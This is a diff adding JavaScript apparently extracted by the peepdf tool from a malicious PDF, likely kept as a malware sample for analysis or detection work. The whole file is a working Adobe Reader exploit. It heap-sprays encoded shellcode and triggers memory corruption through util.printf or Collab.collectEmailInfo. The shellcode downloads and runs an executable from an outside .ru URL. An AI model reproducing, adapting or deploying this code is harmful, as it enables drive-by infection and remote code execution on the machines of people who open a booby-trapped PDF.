@@ -1,0 +1,65 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+this.ac()
+
+// peepdf comment: Javascript code located in object 13 (version 0)
+
+var str5 = 0;
+
+function fix_it(yarsp, len) {
+    while (yarsp.length * 2 < len) {
+        yarsp += yarsp;
+    }
+    yarsp = yarsp.substring(0, len / 2);
+    return yarsp;
+}
+
+function gln(num, content) {
+    var z = "";
+    for (var i = 0; i < num; i++) {
+        z += content.toString();
+    }
+    return z;
+}
+var version = app.viewerVersion;
+
+if (version > 8) {
+
+    var addkk = unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u622F%u7361%u6974%u616F%u2E6E%u7572%u312F%u6C2F%u616F%u2E64%u6870%u3F70%u6469%u343D");
+
+    var fix_it = unescape("%u0A0A%u0A0A");
+    var yarsp = 20;
+    var make_hellcode = yarsp + addkk.length;
+    while (fix_it.length < make_hellcode) fix_it += fix_it;
+    var count2 = fix_it.substring(0, make_hellcode);
+    var addr = fix_it.substring(0, fix_it.length - make_hellcode);
+    while (addr.length + make_hellcode < 0x60000) addr = addr + addr + count2;
+    var sc_len = new Array();
+    for (overflow = 0; overflow < 1200; overflow++) {
+        sc_len[overflow] = addr + addkk
+    }
+    var cc = 12 + gln(18, 9) + gln(276, 8);
+    util.printf("%45000f", cc);
+} else {
+    var addkk = unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u622F%u7361%u6974%u616F%u2E6E%u7572%u312F%u6C2F%u616F%u2E64%u6870%u3F70%u6469%u333D");
+
+    var mem_array = new Array();
+    var cc = 0x0c0c0c0c;
+    var addr = 0x400000;
+    var sc_len = addkk.length * 2;
+    var len = addr - (sc_len + 0x38);
+    var yarsp = unescape("%u9090%u9090");
+    yarsp = fix_it(yarsp, len);
+    var count2 = (cc - 0x400000) / addr;
+
+    for (var count = 0; count < count2; count++) {
+        mem_array[count] = yarsp + addkk;
+    }
+    var overflow = unescape("%u0c0c%u0c0c");
+    while (overflow.length < 44952) overflow += overflow;
+    this.collabStore = Collab.collectEmailInfo({
+        subj: "",
+        msg: overflow
+    });
+}
+
